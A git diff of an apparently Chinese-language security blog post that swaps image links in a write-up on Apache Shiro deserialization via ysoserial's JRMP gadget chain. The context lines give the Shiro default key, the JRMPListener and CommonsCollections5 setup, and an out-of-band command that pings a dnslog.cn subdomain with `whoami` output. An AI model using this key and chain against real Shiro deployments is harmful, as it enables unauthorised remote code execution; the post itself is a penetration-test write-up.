@@ -18,7 +18,7 @@ permalink: /about/JRMP-Gadget/
 
 **芽儿～当时我整个人的是这样的：**
 <div class="col-lg-2">
-<img align="left" src="/static/web-image/JRMP-Gadget/IMG_0678.JPG"/>
+<img align="left" src="https://i.loli.net/2021/11/18/iLHbaIctkf9GWpO.jpg"/>
 </div>
 
 <div>
@@ -39,7 +39,7 @@ permalink: /about/JRMP-Gadget/
 
 不过跑密钥出了个小插曲，登录路由login处设置`rememberMe Cookie`时反包*Set-Cookie*不显示*deleteMe Cookie*，具体原因待更新：[*Different Shiro Framework deserialization analysis ideas*](/about/ShiroDeser/){:target="_blank"}，而从上面的特征我们已经可以肯定存在Shiro框架，当然也可以通过对不存在的路由进行Cookie设置来进行验证。
 
-![](/static/web-image/JRMP-Gadget/shiro-cookie.png)
+![shiro-cookie.png](https://i.loli.net/2021/11/18/5oPJbQEhrz34X8d.png)
 
 由于上面的原因导致有一些匹配回包来检测shiro框架为逻辑工具就在原地划水不动弹，不慌，总有一些“尖子生”，跑出默认密钥：`kPH+bIxk5D2deZiIxcaaaA==`
 
@@ -51,16 +51,17 @@ permalink: /about/JRMP-Gadget/
 
 - ysoserial.jar公网起JRMP端口，转发命令<code>ping `whoami`.x.dnslog.cn</code>
 - JRMP监听显示流量建立链接，查看dnslog：
-![](/static/web-image/JRMP-Gadget/shiro-dnslog.png)
+
+![shiro-dnslog.png](https://i.loli.net/2021/11/18/5EVuHQXA3doCfcJ.png)
 
 `默认加密密钥 -> JRMPClient利用链 -> Shiro反序列化RCE root` 多么赏心悦目，一切都是那么地丝滑。
 <div class="col-lg-3">
-	<img  src="/static/web-image/JRMP-Gadget/IMG_0677.JPG"/>
+	<img  src="https://i.loli.net/2021/11/18/IxPRmipAQ4JfBjH.jpg"/>
 </div>
 <div>
 	<div class="col-lg-8">
 		<strong>然而却帅不过三秒：</strong>
-		<img  src="/static/web-image/JRMP-Gadget/IMG_0679.png"/>
+		<img  src="https://i.loli.net/2021/11/18/rEDCbQHuTF3XY5K.png"/>
 	</div>
 </div>
 <br><br><br>
@@ -78,7 +79,7 @@ permalink: /about/JRMP-Gadget/
 
 ### # 为什么不是root?
 
-![](/static/web-image/JRMP-Gadget/JRMP-logic.png)
+![JRMP-logic.png](https://i.loli.net/2021/11/18/LAM9NcPdRUYWa16.png)
 
 如上图，整张图是我个人对于Java反序列化中对于JRMP利用链的过程理解，从`local Attacker`环节开始，具体细节在这里不做展开叙述，其中存在歧义的地方我使用红色部分进行了标记；个人分析存在的问题也是红色部分：
 
@@ -90,7 +91,9 @@ permalink: /about/JRMP-Gadget/
 > >`ysoserial.exploit.JRMPListener`利用类、`3333`本地JRMP监听端口、`CommonsCollections5`Java反序列化利用链以及转发<code>"ping `whoami`.x.dnslog.cn"</code>命令
 
 再来看另外一张图片：
-![](/static/web-image/JRMP-Gadget/jrmp-low-per.JPG)
+
+![jrmp-low-per.JPG](https://i.loli.net/2021/11/18/me6CANHghjYIOkR.jpg)
+
 我们看上面这一张图，重点在于`ping root.zj6u6s.dnslog.cn`进程对应的用户同样是低权限用户，也就是说是低权限的用户去运行的<code>`whoami`</code>这个命令而且输出的是`root`，但是从Linux权限的常识来看是不会出现这样的情况的。所以有了以下设想：
 
 - 我初步的设想是：**假设1:命令是在受害机器上执行**，那么有几种情况：
